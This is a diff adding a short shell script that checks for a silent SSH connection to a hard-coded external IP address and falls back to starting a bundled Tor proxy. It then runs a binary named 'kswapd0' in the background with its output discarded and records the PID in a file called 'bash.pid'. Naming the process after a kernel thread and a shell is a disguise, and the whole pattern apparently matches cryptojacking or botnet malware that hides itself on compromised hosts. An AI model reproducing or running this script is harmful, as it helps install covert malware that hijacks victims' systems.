@@ -1,0 +1,15 @@
+#!/bin/sh
+./stop
+connok=$(ssh -q -o "BatchMode=yes" -o ConnectTimeout=5 45.9.148.228 "echo 2>&1" && echo $host 1 || echo $host 0)
+if [ $connok -eq "1" ]; then
+      echo "conn ok"
+else
+      export BLIB2_NO_SSH_PROXY=1
+      ./tors/start.sh 1
+fi
+
+sleep 10
+pwd > dir.dir
+dir=$(cat dir.dir)
+nohup ./kswapd0 >>/dev/null &
+echo $! > bash.pid
